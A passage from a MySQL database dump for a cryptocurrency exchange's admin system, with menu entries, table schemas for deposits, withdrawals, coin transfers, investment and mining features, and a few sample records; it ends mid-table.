INSERT INTO `movesay_menu` VALUES ('310', '备份数据库', '9', '2', 'Tools/dataExport', '0', '', '工具', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('311', '还原数据库', '9', '2', 'Tools/dataImport', '0', '', '工具', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('312', '管理员管理', '3', '2', 'User/admin', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('313', '权限列表', '3', '3', 'User/auth', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('314', '编辑添加', '26', '1', 'User/edit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('315', '修改状态', '26', '1', 'User/status', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('316', '编辑添加', '312', '1', 'User/adminEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('317', '修改状态', '312', '1', 'User/adminStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('318', '编辑添加', '313', '1', 'User/authEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('319', '修改状态', '313', '1', 'User/authStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('320', '重新初始化权限', '313', '1', 'User/authStart', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('321', '编辑添加', '282', '1', 'User/logEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('322', '修改状态', '282', '1', 'User/logStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('323', '编辑添加', '283', '1', 'User/qianbaoEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('324', '修改状态', '283', '1', 'User/qianbaoStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('325', '编辑添加', '284', '1', 'User/bankEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('326', '修改状态', '284', '1', 'User/bankStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('327', '编辑添加', '285', '1', 'User/coinEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('328', '财产统计', '285', '1', 'User/coinLog', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('329', '编辑添加', '286', '1', 'User/goodsEdit', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('330', '修改状态', '286', '1', 'User/goodsStatus', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('331', '编辑添加', '278', '1', 'Article/typeEdit', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('332', '修改状态', '278', '100', 'Article/typeStatus', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('333', '编辑添加', '280', '1', 'Article/linkEdit', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('334', '修改状态', '280', '100', 'Article/linkStatus', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('335', '编辑添加', '279', '1', 'Article/adverEdit', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('336', '修改状态', '279', '100', 'Article/adverStatus', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('337', '上传图片', '279', '100', 'Article/adverImage', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('375', '客服代码', '10', '5', 'Cloud/kefu', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('376', '使用', '375', '5', 'Cloud/kefuUp', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('377', '访问授权', '313', '1', 'User/authAccess', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('378', '访问授权修改', '313', '1', 'User/authAccessUp', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('379', '成员授权', '313', '1', 'User/authUser', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('380', '成员授权增加', '313', '1', 'User/authUserAdd', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('381', '成员授权解除', '313', '1', 'User/authUserRemove', '1', '', '用户', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('382', '币种配置', '7', '4', 'Config/coin', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('383', '推广奖励', '8', '1', 'Operate/index', '0', '', '运营', '0', 'share');
INSERT INTO `movesay_menu` VALUES ('384', 'APP配置', '8', '1', 'App/config', '0', '', 'APP管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('385', 'APP等级', '8', '2', 'App/vip_config_list', '0', '', 'APP管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('386', 'APP广告板块', '8', '3', 'App/adsblock_list', '0', '', 'APP管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('387', 'APP广告用户', '8', '4', 'App/ads_user', '0', '', 'APP管理', '0', 'time');
INSERT INTO `movesay_menu` VALUES ('388', '导航配置', '7', '7', 'Config/daohang', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('418', '主题模板', '10', '4', 'Cloud/theme', '0', '', '扩展', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('425', '商品管理', '6', '1', 'Shop/index', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('426', '商城配置', '6', '2', 'Shop/config', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('427', '商品类型', '6', '3', 'Shop/type', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('428', '付款方式', '6', '4', 'Shop/coin', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('429', '购物记录', '6', '5', 'Shop/log', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('430', '收货地址', '6', '6', 'Shop/goods', '0', '', '商城管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('431', '认购管理', '6', '1', 'Issue/index', '0', '', '认购管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('432', '认购记录', '6', '1', 'Issue/log', '0', '', '认购管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('433', '分红管理', '6', '3', 'Fenhong/index', '0', '', '分红管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('434', '分红记录', '6', '5', 'Fenhong/log', '0', '', '分红管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('435', '充值记录', '6', '1', 'Huafei/index', '0', '', '话费充值', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('436', '充值配置', '6', '1', 'Huafei/config', '0', '', '话费充值', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('437', '充值金额', '6', '3', 'Huafei/type', '0', '', '话费充值', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('438', '付款方式', '6', '4', 'Huafei/coin', '0', '', '话费充值', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('448', '用户财产日志', '3', '100', 'User/coinlogs', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('441', '理财管理', '6', '1', 'Money/index', '0', '', '理财管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('442', '理财日志', '6', '2', 'Money/log', '0', '', '理财管理', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('443', '理财明细', '6', '3', 'Money/fee', '0', '', '理财管理', '0', 'globe');

-- ----------------------------
-- Table structure for movesay_message
-- ----------------------------
DROP TABLE IF EXISTS `movesay_message`;
CREATE TABLE `movesay_message` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `type` varchar(50) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `addip` varchar(200) NOT NULL,
  `addr` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(10) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_message
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_message_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_message_log`;
CREATE TABLE `movesay_message_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `type` varchar(50) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `addip` varchar(200) NOT NULL,
  `addr` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(10) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_message_log
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_money
-- ----------------------------
DROP TABLE IF EXISTS `movesay_money`;
CREATE TABLE `movesay_money` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `num` bigint(20) unsigned NOT NULL DEFAULT '0',
  `deal` int(11) unsigned NOT NULL DEFAULT '0',
  `tian` int(11) unsigned NOT NULL,
  `fee` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='投资理财表';

-- ----------------------------
-- Records of movesay_money
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_money_fee
-- ----------------------------
DROP TABLE IF EXISTS `movesay_money_fee`;
CREATE TABLE `movesay_money_fee` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `money_id` int(11) NOT NULL,
  `type` tinyint(4) NOT NULL,
  `num` int(6) NOT NULL,
  `content` varchar(255) NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_money_fee
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_money_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_money_log`;
CREATE TABLE `movesay_money_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `name` varchar(50) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `feea` decimal(20,8) unsigned NOT NULL,
  `tian` int(11) unsigned NOT NULL,
  `tiana` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  `money_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='理财记录表';

-- ----------------------------
-- Records of movesay_money_log
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_mycz
-- ----------------------------
DROP TABLE IF EXISTS `movesay_mycz`;
CREATE TABLE `movesay_mycz` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `mum` int(11) unsigned NOT NULL,
  `type` varchar(50) NOT NULL,
  `tradeno` varchar(50) NOT NULL,
  `remark` varchar(250) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=141 DEFAULT CHARSET=utf8 COMMENT='充值记录表';

-- ----------------------------
-- Records of movesay_mycz
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_mycz_invit
-- ----------------------------
DROP TABLE IF EXISTS `movesay_mycz_invit`;
CREATE TABLE `movesay_mycz_invit` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `userid` int(11) unsigned NOT NULL COMMENT '用户id',
  `invitid` int(11) unsigned NOT NULL COMMENT '推荐人id',
  `num` decimal(20,2) unsigned NOT NULL COMMENT '操作金额',
  `fee` decimal(20,8) unsigned NOT NULL COMMENT '赠送金额',
  `coinname` varchar(50) NOT NULL COMMENT '赠送币种',
  `mum` decimal(20,8) unsigned NOT NULL COMMENT '到账金额',
  `remark` varchar(250) NOT NULL COMMENT '备注',
  `sort` int(11) unsigned NOT NULL COMMENT '排序',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `endtime` int(11) unsigned NOT NULL COMMENT '编辑时间',
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='充值赠送';

-- ----------------------------
-- Records of movesay_mycz_invit
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_mycz_type
-- ----------------------------
DROP TABLE IF EXISTS `movesay_mycz_type`;
CREATE TABLE `movesay_mycz_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `max` varchar(200) NOT NULL COMMENT '名称',
  `min` varchar(200) NOT NULL COMMENT '名称',
  `kaihu` varchar(200) NOT NULL COMMENT '名称',
  `truename` varchar(200) NOT NULL COMMENT '名称',
  `name` varchar(50) NOT NULL,
  `title` varchar(50) NOT NULL,
  `url` varchar(50) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `img` varchar(50) NOT NULL,
  `extra` varchar(50) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='充值类型';

-- ----------------------------
-- Records of movesay_mycz_type
-- ----------------------------
INSERT INTO `movesay_mycz_type` VALUES ('1', '', '', '**********', '***', 'alipay', '支付宝转账支付', '', '***********', '', '5811a25804514.jpg', '', '需要在联系方式里面设置支付宝账号', '0', '0', '0', '1');
INSERT INTO `movesay_mycz_type` VALUES ('2', '', '', '************', '***', 'weixin', '微信转账支付', '', '*************', '', '5811a215e4828.jpg', '', '需要在联系方式里面设置微信账号', '0', '0', '0', '1');
INSERT INTO `movesay_mycz_type` VALUES ('3', '100000', '500', '***********', '***', 'bank', '网银转账支付', '', '****************', '', '5811a1f5d9910.jpg', '', '需要在联系方式里面按照格式天数收款银行账号', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for movesay_mytx
-- ----------------------------
DROP TABLE IF EXISTS `movesay_mytx`;
CREATE TABLE `movesay_mytx` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `fee` decimal(20,2) unsigned NOT NULL,
  `mum` decimal(20,2) unsigned NOT NULL,
  `truename` varchar(32) NOT NULL,
  `name` varchar(32) NOT NULL,
  `bank` varchar(250) NOT NULL,
  `bankprov` varchar(50) NOT NULL,
  `bankcity` varchar(50) NOT NULL,
  `bankaddr` varchar(50) NOT NULL,
  `bankcard` varchar(200) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='提现记录表';

-- ----------------------------
-- Records of movesay_mytx
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_myzc
-- ----------------------------
DROP TABLE IF EXISTS `movesay_myzc`;
CREATE TABLE `movesay_myzc` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `username` varchar(200) NOT NULL,
  `coinname` varchar(200) NOT NULL,
  `txid` varchar(200) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM AUTO_INCREMENT=9065 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_myzc
-- ----------------------------
INSERT INTO `movesay_myzc` VALUES ('9032', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '1.00000000', '0.00000000', '1.00000000', '0', '1505471286', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9033', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '1.00000000', '0.00000000', '1.00000000', '0', '1505471390', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9034', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '1.00000000', '0.00000000', '1.00000000', '0', '1505472216', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9035', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '1.00000000', '0.00000000', '1.00000000', '0', '1505472311', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9036', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '1.00000000', '0.00000000', '1.00000000', '0', '1505472323', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9037', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '1.00000000', '0.00000000', '1.00000000', '0', '1505472372', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9038', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505472774', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9039', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473190', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9040', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473204', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9041', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473238', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9042', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473447', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9043', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473459', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9044', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473657', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9045', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473664', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9046', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473676', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9047', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473688', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9048', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473689', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9049', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473720', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9050', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473723', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9051', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473876', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9052', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473878', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9053', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473885', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9054', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473891', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9055', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473897', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9056', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473899', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9057', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473900', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9058', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473901', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9059', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '2.00000000', '0.00000000', '2.00000000', '0', '1505473902', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9060', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '5.00000000', '0.00000000', '5.00000000', '0', '1505473928', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9061', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '5.00000000', '0.00000000', '5.00000000', '0', '1505473996', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9062', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '1.00000000', '0.00000000', '1.00000000', '0', '1505474024', '0', '1');
INSERT INTO `movesay_myzc` VALUES ('9063', '4944', 'pKugGZvJf80N3hbyRJXnfBTUOYoClYPGa0', 'sgc', '', '4.00000000', '0.00000000', '4.00000000', '0', '1505474106', '0', '1');

-- ----------------------------
-- Table structure for movesay_myzc_fee
-- ----------------------------
DROP TABLE IF EXISTS `movesay_myzc_fee`;
CREATE TABLE `movesay_myzc_fee` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `username` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `coinname` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `txid` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `type` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `fee` decimal(20,8) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=339 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_myzc_fee
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_myzr
-- ----------------------------
DROP TABLE IF EXISTS `movesay_myzr`;
CREATE TABLE `movesay_myzr` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `username` varchar(200) NOT NULL,
  `coinname` varchar(200) NOT NULL,
  `txid` varchar(200) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM AUTO_INCREMENT=9811 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_myzr
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_pool
-- ----------------------------
DROP TABLE IF EXISTS `movesay_pool`;
CREATE TABLE `movesay_pool` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `ico` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `tian` int(11) unsigned NOT NULL,
  `limit` varchar(50) NOT NULL,
  `power` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='矿机类型表';

-- ----------------------------
-- Records of movesay_pool
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_pool_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_pool_log`;
CREATE TABLE `movesay_pool_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `name` varchar(50) NOT NULL,
  `ico` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `tian` int(11) unsigned NOT NULL,
  `limit` varchar(50) NOT NULL,
  `power` varchar(50) NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `use` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='矿机管理';

-- ----------------------------
-- Records of movesay_pool_log
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_prompt
-- ----------------------------
DROP TABLE IF EXISTS `movesay_prompt`;
CREATE TABLE `movesay_prompt` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  `url` varchar(200) NOT NULL,
  `img` varchar(200) NOT NULL,
  `mytx` varchar(200) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_prompt
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_shop
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop`;
CREATE TABLE `movesay_shop` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `coinlist` varchar(255) NOT NULL,
  `img` varchar(255) NOT NULL,
  `type` varchar(255) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `num` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `deal` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `content` text NOT NULL,
  `max` varchar(255) NOT NULL,
